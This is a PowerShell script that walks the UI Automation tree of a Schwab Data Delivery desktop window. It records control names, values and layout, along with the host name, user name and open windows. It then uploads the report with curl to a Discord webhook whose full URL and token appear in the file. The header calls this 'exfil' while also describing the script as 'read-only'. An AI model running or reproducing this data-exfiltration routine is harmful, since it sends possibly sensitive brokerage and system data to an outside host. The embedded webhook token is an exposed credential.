# uia1.ps1 -- dump SDD's UIAutomation tree, exfil to Discord webhook
# Read-only inspection. No side effects on SDD.
$ErrorActionPreference = 'Continue'
$WH = 'https://discord.com/api/webhooks/1495923230614229024/Uf2BDYaB9-WlIHWGzilU3Tb4pvi0JlVN0ZW1kqbUjAkMZV79fCHQoVlBZpZgvmlltWtE'

Add-Type -AssemblyName UIAutomationClient
Add-Type -AssemblyName UIAutomationTypes

$out = @()

function Push-Tree {
    $rep = Join-Path $env:TEMP 'sdd-uia-tree.txt'
    ($out -join "`r`n") | Set-Content -LiteralPath $rep -Encoding UTF8
    $sz = (Get-Item -LiteralPath $rep).Length
    & curl.exe -s -o NUL -w ("EXFIL bytes=$sz http=%{http_code}`n") -A 'DiscordBot (clawcode,1.0)' -F ("file=@$rep") $WH | Write-Host
}

function Find-SddWindow {
    $candidates = @('Schwab.SI.SI2Desktop.Container','Schwab.SI.SI2Desktop','SDD')
    foreach ($n in $candidates) {
        $procs = Get-Process -Name $n -ErrorAction SilentlyContinue
        foreach ($p in $procs) {
            if ($p.MainWindowHandle -ne [IntPtr]::Zero -and $p.MainWindowTitle -match 'Schwab') { return $p }
        }
    }
    $procs = Get-Process | Where-Object { $_.MainWindowHandle -ne [IntPtr]::Zero -and $_.MainWindowTitle -match 'Schwab' }
    if ($procs.Count -ge 1) { return $procs[0] }
    return $null
}

function Walk-Tree {
    param([System.Windows.Automation.AutomationElement]$Element, [int]$Depth = 0, [int]$MaxDepth = 14)
    if ($null -eq $Element -or $Depth -gt $MaxDepth) { return }
    $indent = '  ' * $Depth
    try {
        $name = $Element.Current.Name
        $id   = $Element.Current.AutomationId
        $ct   = $Element.Current.ControlType.ProgrammaticName -replace 'ControlType\.', ''
        $cls  = $Element.Current.ClassName
        $en   = $Element.Current.IsEnabled
        $vis  = -not $Element.Current.IsOffscreen
        try { $bb = $Element.Current.BoundingRectangle } catch { $bb = $null }
    } catch {
        $script:out += "$indent[error reading element: $_]"; return
    }
    $patterns = @()
    foreach ($pat in @(
        @{ Name='Invoke';     Id=[System.Windows.Automation.InvokePattern]::Pattern },
        @{ Name='Toggle';     Id=[System.Windows.Automation.TogglePattern]::Pattern },
        @{ Name='Selection';  Id=[System.Windows.Automation.SelectionPattern]::Pattern },
        @{ Name='SelectionItem'; Id=[System.Windows.Automation.SelectionItemPattern]::Pattern },
        @{ Name='Value';      Id=[System.Windows.Automation.ValuePattern]::Pattern },
        @{ Name='ExpandColl'; Id=[System.Windows.Automation.ExpandCollapsePattern]::Pattern }
    )) {
        $p = $null
        if ($Element.TryGetCurrentPattern($pat.Id, [ref]$p)) { $patterns += $pat.Name }
    }
    $patStr = ''; if ($patterns.Count -gt 0) { $patStr = ' patterns=' + ($patterns -join ',') }
    $nameStr = ''; if ($name) { $nameStr = " `"$name`"" }
    $idStr = '';   if ($id)   { $idStr   = " id=$id" }
    $clsStr = '';  if ($cls)  { $clsStr  = " class=$cls" }
    $enStr = ' [disabled]'; if ($en) { $enStr = ' [enabled]' }
    $visStr = ' [offscreen]'; if ($vis) { $visStr = '' }
    $rectStr = ''
    if ($bb -and -not [double]::IsInfinity($bb.X)) {
        $rectStr = ' rect=' + [int]$bb.X + ',' + [int]$bb.Y + ',' + [int]$bb.Width + 'x' + [int]$bb.Height
    }
    $script:out += "$indent$ct$nameStr$idStr$clsStr$enStr$visStr$patStr$rectStr"
    try {
        $walker = [System.Windows.Automation.TreeWalker]::ControlViewWalker
        $child = $walker.GetFirstChild($Element)
        while ($null -ne $child) {
            Walk-Tree -Element $child -Depth ($Depth + 1) -MaxDepth $MaxDepth
            $child = $walker.GetNextSibling($child)
        }
    } catch { $script:out += "$indent  [error walking children: $_]" }
}

$out += "===== SDD UIAutomation Inspection ====="
$out += "Host: $env:COMPUTERNAME  User: $env:USERNAME  Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss zzz')"
$out += ""

$proc = Find-SddWindow
if (-not $proc) {
    $out += "ERROR: Could not find Schwab Data Delivery process. Is SDD running?"
    $out += (Get-Process | Where-Object { $_.MainWindowHandle -ne [IntPtr]::Zero } | Format-Table Id,ProcessName,MainWindowTitle -AutoSize | Out-String)
    Push-Tree; return
}
$out += "SDD process: PID=$($proc.Id) Name=$($proc.ProcessName) Title=$($proc.MainWindowTitle)"
$out += "Path: $($proc.Path)"
$out += ""

$rootCond = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::ProcessIdProperty, $proc.Id)
$sddElems = [System.Windows.Automation.AutomationElement]::RootElement.FindAll([System.Windows.Automation.TreeScope]::Children, $rootCond)
if ($sddElems.Count -eq 0) {
    $out += "ERROR: No top-level AutomationElement found for PID $($proc.Id)"
    Push-Tree; return
}
$out += "Found $($sddElems.Count) top-level window(s) for PID $($proc.Id). Walking (max depth 14)..."
$out += ""
for ($i = 0; $i -lt $sddElems.Count; $i++) {
    $out += "=== Window $($i+1) of $($sddElems.Count) ==="
    Walk-Tree -Element $sddElems[$i] -Depth 0
    $out += ""
}

$out += "===== Other top-level windows (modal/dialog scan) ====="
$walker = [System.Windows.Automation.TreeWalker]::ControlViewWalker
$top = $walker.GetFirstChild([System.Windows.Automation.AutomationElement]::RootElement)
$dialogCount = 0
while ($null -ne $top) {
    try {
        $tn = $top.Current.Name
        if ($top.Current.ProcessId -ne $proc.Id -and ($tn -match 'Schwab|Download|Confirm|Error|Warning|Information')) {
            $out += ""
            $out += "--- Other window: `"$tn`" PID=$($top.Current.ProcessId) class=$($top.Current.ClassName) ---"
            Walk-Tree -Element $top -Depth 1
            $dialogCount++
        }
    } catch {}
    $top = $walker.GetNextSibling($top)
}
if ($dialogCount -eq 0) { $out += "(no related top-level dialogs found)" }
$out += ""
$out += "===== End of inspection ====="
Push-Tree
Write-Host "done"
